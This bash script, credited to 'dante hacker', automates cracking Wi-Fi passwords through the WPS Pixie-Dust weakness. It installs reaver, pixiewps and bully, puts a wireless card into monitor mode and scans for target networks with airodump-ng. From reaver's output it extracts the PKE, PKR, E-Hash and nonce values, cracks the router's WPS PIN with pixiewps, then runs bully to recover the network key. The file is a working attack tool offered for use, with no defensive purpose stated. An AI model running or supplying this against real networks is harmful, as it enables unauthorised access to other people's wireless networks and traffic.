#!/bin/bash

# Regular Colors
Black='\e[0;30m'        # Black
Red='\e[0;31m'          # Red
Green='\e[0;32m'        # Green
Yellow='\e[0;33m'       # Yellow
Blue='\e[0;34m'         # Blue
Purple='\e[0;35m'       # Purple
Cyan='\e[0;36m'         # Cyan
White='\e[0;37m'        # White

# Bold
BBlack='\e[1;30m'       # Black
BRed='\e[1;31m'         # Red
BGreen='\e[1;32m'       # Green
BYellow='\e[1;33m'      # Yellow
BBlue='\e[1;34m'        # Blue
BPurple='\e[1;35m'      # Purple
BCyan='\e[1;36m'        # Cyan
BWhite='\e[1;37m'       # White

re='Y'
while [ $re == 'Y' ] || [ $re == 'y' ] || [ $re == 'Yes' ] || [ $re == 'YES' ] || [ $re == 'yes' ] || [ $re == 'O' ] || [ $re == 'o' ] || [ $re == 'Oui' ] || [ $re == 'OUI' ] || [ $re == 'oui' ]
do
clear
echo -n "               "
echo -e $Purple"
                 
                
               
                                                       "                     
	sleep 0.1 && echo -e $rojo "                   | |       // | |______||____| |___"                     
	sleep 0.1 && echo -e $rojo "                   | |      //  | |______      | |"
	sleep 0.1 && echo -e $rojo "                   | | /\  //   | |______|     | |"
	sleep 0.1 && echo -e $rojo "                   | |/  \//    | |         ___| |___ "
	sleep 0.1 && echo -e $rojo "                   |_/_/ |_/    |_|        |___|_|___| 
                
             
 
	  $BRed DANTE LINUX PROGRAMER"
echo ""
echo -e "  $Blue[1]$Cyan search network and find target and "
echo -e "  $blue[2]$Cyan enter pin network to show key$BRed find password."
echo ""
echo -e -n "$White     [+] Select$BRed one$White thing from the menu : "
read menu
case $menu in
             "1")
			     reaver 2&> Ver_Reaver.txt
                 pixiewps 2&> Ver_Pixiewps.txt
				 Ver_libpcap_dev=`dpkg -l | grep libpcap0.8-dev`
				 Ver_libsqlite3_dev=`dpkg -l | grep libsqlite3-dev`
				 Ver_Reaver=`cat Ver_Reaver.txt | grep 'Reaver v1.5.2'`
                 Ver_Pixiewps=`cat Ver_Pixiewps.txt | grep 'Pixiewps 1.1'`
                 VerMon=`airmon-ng | grep mon*`
                 VerCar=`airmon-ng | wc -l`
				 Uname=`uname -m`
				 rm -rf  Ver_Reaver.txt Ver_Pixiewps.txt
				 echo ""
				 if [ "$Ver_libpcap_dev" = "" ]
				      then
					       echo ""
					       echo -e "$Red [!]$White Libpcap-dev not found ..."
						   sleep 3
						   echo -e "$White [+] Please wait until the$Green Libpcap-dev$White install ..."
						   echo ""
						   sleep 2
						   if [ $Uname == 'i686' ]
		                   	    then
						            cd Tools/32bits
						            dpkg -i libpcap0.8-dev_1.3.0-1_i386.deb
                                    dpkg -i libpcap-dev_1.3.0-1_all.deb
						            cd ../..
						        else
						        	cd Tools/64bits
						            dpkg -i libpcap0.8-dev_1.3.0-1_amd64.deb
                                    dpkg -i libpcap-dev_1.3.0-1_all.deb
						            cd ../..
							fi
			     fi
				 if [ "$Ver_libsqlite3_dev" = "" ]
				      then
					       echo ""
					       echo -e "$Red [!]$White Libsqlite3-dev not found ..."
						   sleep 3
						   echo -e "$White [+] Please wait until the$Green Libsqlite3-dev$White install ..."
						   sleep 2
						   if [ $Uname == 'i686' ]
		                   	    then
								    cd Tools/32bits
						            dpkg -i libsqlite3-dev_3.7.16.2-1~bpo70+1_i386.deb
						            cd ../..
								else
								    cd Tools/64bits
									dpkg -i libsqlite3-dev_3.7.16.2-1~bpo70+1_amd64.deb
									cd ../..
				 fi
				 fi
				 if [ "$Ver_Pixiewps" = "" ]
				      then
					       echo ""
						   echo -e "$Red [!]$White Pixiewps not found ..."
						   sleep 3
						   echo -e "$White [+] Please wait until the$Green Pixiewps$White install ..."
						   sleep 2
						   cd Tools
					       unzip pixiewps-master.zip
						   cd pixiewps-master/src
						   make
						   make install
						   cd ../..
						   rm -rf pixiewps-master
						   cd ..
				fi
				if [ "$Ver_Reaver" = "" ]
				      then
					       echo ""
						   echo -e "$Red [!]$White Reaver not found ..."
						   sleep 3
						   echo -e "$White [+] Please wait until the$Green Reaver $White install ..."
						   sleep 2
						   cd Tools
					       unzip reaver-wps-fork-t6x-master.zip
						   cd reaver-wps-fork-t6x-master/src
						   chmod +x configure
						   ./configure
						   make
						   make install
						   cd ../..
						   rm -rf reaver-wps-fork-t6x-master
						   cd ..
				fi
				 echo "[+] Scanning for wireless devices ..."
                 if [ $VerCar -gt 5 ] && [ "$VerMon" = "" ]
                      then
                           Num_Line=`airmon-ng | grep wlan* | wc -l`
						   echo -e "[+] We found$Green $Num_Line$White Wireless devices."
						   echo ""
						   echo -e -n $BRed""
						   airmon-ng | grep -e Interface | cut -f1-3
						   echo ""
						   echo -e -n $BGreen
						   airmon-ng | grep -e wlan* | cut -f1-3
						   echo ""
						   echo -e -n "${White}[+] Select$BRed one$White interface of the wireless devices (Ex:${BGreen}wlan0,wlan1${BRed}...${White}) : $Green "
						   read wlan
						   echo -e "$White[+] Enabling monitor mode on $Green $wlan $White..."
                           airmon-ng start $wlan > /dev/null
                 elif [ $VerCar -le 5 ] 
                      then    
                           echo "" 
                           sleep 0.5
                           echo -n -e $BWhite" [!]"
                           echo -e $BRed" Wireless Card Not Found"
                           echo ""
                           sleep 0.5
                 fi
                 VerMon=`airmon-ng | grep mon*`
                 VerCar=`airmon-ng | wc -l`
                 if [ "$VerMon" != "" ]
                      then
                           cou_mon=`airmon-ng | grep mon* | wc -l`
						   if [ $cou_mon -le 1 ]
						        then
								    mon=`airmon-ng | grep mon* | cut -f1`
								else
								    echo "[+] We found $cou_mon monitor mode."
									echo ""
						            echo -e -n $BRed""
						            airmon-ng | grep -e Interface | cut -f1-3
						            echo ""
						            echo -e -n $BGreen
									airmon-ng | grep mon* | cut -f1-3
									echo ""
									echo -e -n "[+] ${White}[+] Select$BRed one$White interface of the monitor mode (Ex:${BRed}mon0,mon1...${White}) : $Green"
									read mon
						   fi
						   echo -e "$Red[!]$White Click$Green CTRL+C$White when ready,good luck"
						   sleep 2 
						   airodump-ng $mon
                           echo ""
                           echo -n -e "${White}  [+]$Blue BSSID : $White"
                           read  BSSID
                           sleep 0.5
						   echo ""
                           echo -n -e "${White}  [+]$Blue Channel : $White"
                           read  CH
                           echo ""
						   echo -e "$Red[!]$White Click$Green CTRL+C$White when you capture$Green the required arguments$White."
						   echo ""
						   sleep 1
                           reaver -i $mon -b $BSSID -c $CH -vv | tee Reaver.txt
						   Manufacturer=`cat Reaver.txt | grep Manufacturer: | cut -d' ' -f2- | sed  -n 1p`
						   Model_Name=`cat Reaver.txt | grep Name: | cut -d' ' -f2- | sed -n 1p`
						   Model_Number=`cat Reaver.txt | grep 'Model Number:' | cut -d' ' -f2- | sed -n 1p`
						   Serial_Number=`cat Reaver.txt | grep 'Serial Number:' | cut -d' ' -f2- | sed -n 1p`
                           e=`cat Reaver.txt | grep PKE: | cut -d' ' -f3 | sed -n 1p`
                           r=`cat Reaver.txt | grep PKR: | cut -d' ' -f3 | sed -n 1p`
                           s=`cat Reaver.txt | grep E-Hash1: | cut -d' ' -f3 | sed -n 1p`
                           z=`cat Reaver.txt | grep E-Hash2: | cut -d' ' -f3 | sed -n 1p`
                           a=`cat Reaver.txt | grep AuthKey: | cut -d' ' -f3 | sed -n 1p`
                           n=`cat Reaver.txt | grep E-Nonce: | cut -d' ' -f3 | sed -n 1p`
                           m=`cat Reaver.txt | grep R-Nonce: | cut -d' ' -f3 | sed -n 1p`
                           WPS=`cat Reaver.txt | grep 'WPS PIN'`
						   rm -rf Reaver.txt
                           if [ "$WPS" == "" ]
                                then
								     clear
									 echo ""
									 echo -e "$Red [+]$Yellow all required arguments : "
									 echo ""
									 sleep 0.2
						   		     echo -e "$White [+] $Manufacturer"
						   		     echo ""
						   		     sleep 0.2
						   		     echo -e "$White [+] $Model_Name"
		     						 echo ""
						   		     sleep 0.2
						   		     echo -e "$White [+] $Model_Number"
						   		     echo ""
						   		     sleep 0.2
						   		     echo -e "$White [+] $Serial_Number"
						   		     echo ""
						   		     sleep 0.2
									 if [ "$e" != "" ]
									       then
                           		               echo -e "$White [+] PKE: $Green$e"
										   else
											   echo -e "$White [+] PKE:$Red Not found"
									 fi
                           		     echo ""
						   		     sleep 0.2
                           		     if [ "$r" != "" ]
									       then
									           echo -e "$White [+] PKR: $Green$r"
										   else
										       echo -e "$White [+] PKR:$Red Not found"
									 fi
                           		     echo ""
						   		     sleep 0.2
                           		     if [ "$s" != "" ]
                                           then									 
									           echo -e "$White [+] E-Hash1: $Green$s"
										   else
										       echo -e "$White [+] E-Hash1:$Red Not found"
									 fi
                           		     echo ""
						   		     sleep 0.2
									 if [ "$z" != "" ]
									      then
                           		              echo -e "$White [+] E-Hash2: $Green$z "
										  else
										      echo -e "$White [+] E-Hash2:$Red Not found"
									 fi
                           		     echo ""
						   		     sleep 0.2
                           		     if [ "$a" != "" ]
									      then
									          echo -e "$White [+] AuthKey: $Green$a "
										  else
										      echo -e "$White [+] AuthKey:$Red Not found"
									 fi
                           		     echo ""
						   		     sleep 0.2
                           		     if [ "$n" != "" ]
									      then
									          echo -e "$White [+] E-Nonce: $Green$n "
										  else
										      echo -e "$White [+] E-Nonce:$Red Not found"
									 fi
                           		     echo ""
						   		     sleep 0.2
									 if [ "$m" != "" ]
									      then
                           		              echo -e "$White [+] R-Nonce: $Green$m "
										  else
										      echo -e "$White [+] R-Nonce:$Red Not found"
									 fi
                           		     echo ""
						   		     sleep 0.2
                           		     echo -e "$White [+] BSSID: $Green$BSSID "
                           		     echo ""
						   		     sleep 0.2
                           		     echo -e "$White [+] CH: $Green$CH "
                           		     echo ""
						   		     sleep 0.2
									 if [ "$e" != "" ] && [ "$r" != "" ] && [ "$s" != "" ] && [ "$z" != "" ] && [ "$a" != "" ] && [ "$n" != "" ] && [ "$m" != "" ]
									      then
                                              echo -e "$White [+]$Red Wait until the$Green PIN$Red is cracked,this may take around 30 minutes ...$White"
                                              sleep 0.5
											  Ver_Dir=`ls | grep PIN`
											  if [ "$Ver_Dir" == "" ];then
											           mkdir PIN
											  fi
											  Ver_p=`ls PIN | grep ${BSSID}`
											  if [ "$Ver_p" != "" ]
											       then
											           Ver_T=`cat PIN/$BSSID* | grep -e 'WPS pin' | wc -l`
												   else
												       Ver_T=0
											  fi
											  if [ "$Ver_p" != "" ] && [ $Ver_T -gt 0 ]
											       then
											           echo ""
											           echo -e " [+]$BGreen $BSSID$White is already cracked : "
                                           	           cat PIN/${BSSID}.txt
                                              else					  
                                                  pixiewps -v 3 -f -e $e -r $r -s $s -z $z -a $a -n $n -m $m -b $BSSID | tee PIN/${BSSID}.txt
									              PIN=`less PIN/${BSSID}.txt | grep 'WPS pin:' | cut -d" " -f8`
									              if [ "$PIN" != "" ]
									                   then
										                    echo ""
										                    echo -e "$White [+] Running$Green bully$White with the correct$Green PIN$White, wait ..."
											                echo ""
										                    bully -b $BSSID -c $CH -B -F -p $PIN $mon
											                echo -e "$Yellow [+]$Green Congratulation (^_^) "
													        echo ""
									              else
									                   echo ""
										               echo -e "$Red [!]$White Sorry pin not found,good luck next time."
												       echo ""
												       cd PIN;
													   rm -rf ${BSSID}.txt
												       cd ..
									               fi
											  fi
									      else
										      echo -e "$Red [!]$Yellow Not all required arguments have been supplied!"
											  echo ""
									  fi
                           fi
						   rm -rf airmon-ng pixiewps.txt
                 fi
                 ;;
			"2")
				  VerMon=`airmon-ng | grep mon*`
                  VerCar=`airmon-ng | wc -l`
                  echo "[+] Scanning for wireless devices ..."
                  if [ $VerCar -gt 5 ] && [ "$VerMon" = "" ]
                        then
                           Num_Line=`airmon-ng | grep wlan* | wc -l`
						   echo -e "[+] We found$Green $Num_Line$White Wireless devices."
						   echo ""
						   echo -e -n $BRed""
						   airmon-ng | grep -e Interface | cut -f1-3
						   echo ""
						   echo -e -n $BGreen
						   airmon-ng | grep -e wlan* | cut -f1-3
						   echo ""
						   echo -e -n "${White}[+] Select$BRed One$White interface of the wireless devices (Ex:${BGreen}wlan0,wlan1${BRed}...${White}) : $Green "
						   read wlan
						   echo -e "$White[+] Enabling monitor mode on $Green $wlan $White..."
                           airmon-ng start $wlan > /dev/null
                  elif [ $VerCar -le 5 ] 
                       then    
                            echo "" 
                            sleep 0.5
                            echo -n -e $BWhite"[!]"
                            echo -e $BRed" Wireless Card Not Found"
                            echo ""
                            sleep 0.5
							exit
                  fi
		          VerMon=`airmon-ng | grep mon*`
                  VerCar=`airmon-ng | wc -l`
                  if [ "$VerMon" != "" ]
                       then
                           cou_mon=`airmon-ng | grep mon* | wc -l`
						   if [ $cou_mon -le 1 ]
						        then
								    mon=`airmon-ng | grep mon* | cut -f1`
								else
								    echo "[+] We found $cou_mon monitor mode."
									echo ""
						            echo -e -n $BRed""
						            airmon-ng | grep -e Interface | cut -f1-3
						            echo ""
						            echo -e -n $BGreen
									airmon-ng | grep mon* | cut -f1-3
									echo ""
									echo -e -n "[+] ${White}[+] Select$BRed One$White interface of the monitor mode (Ex:${BRed}mon0,mon1...${White}) : $Green"
									read mon
						   fi
						   clear
						   echo ""
						   echo -e "$White   [+]$Green Fill in all the blanks :"
						   echo""
                           echo -e -n "$Cyan         [+]$Yellow PIN : $White"
                           read PIN
                           echo ""						   
					       echo -e -n "$Cyan         [+]$Yellow BSSID : $White"
						   read BSSID
						   echo ""
						   echo -e -n "$Cyan         [+]$Yellow CH (Channel) : $White"
						   read CH
						   echo ""
						   bully -b $BSSID -c $CH -B -F -p $PIN $mon 
						   
				fi
				;;
			  *)
			   echo ""
			   echo -e "$BRed     [!]$BWhite Input out of range."
			   echo ""
			   ;;
esac
echo -e "$Cyan [*]$blue WFI$White By$Bwhite dante hacker created ."
echo ""
echo -n -e "$Red                 [+]$BWhite Try again (${BGreen}Y${BWhite})es or (${BGreen}N${BWhite})o :$BGreen "
read re
echo ""
   while [ $re != 'Y' ] && [ $re != 'y' ] && [ $re != 'Yes' ] && [ $re != 'YES' ] && [ $re != 'yes' ] && [ $re != 'N' ] && [ $re != 'n' ] && [ $re != 'No' ] && [ $re != 'NO' ] && [ $re != 'no' ] && [ $re != 'O' ] && [ $re != 'o' ] && [ $re != 'Oui' ] && [ $re != 'OUI' ] && [ $re != 'oui' ]
         do
           echo -n -e "$Red                 [+]$White Try again (${BGreen}Y${White})es or (${BGreen}N${White})o :$BGreen "
           read re
           echo ""
   done
done 
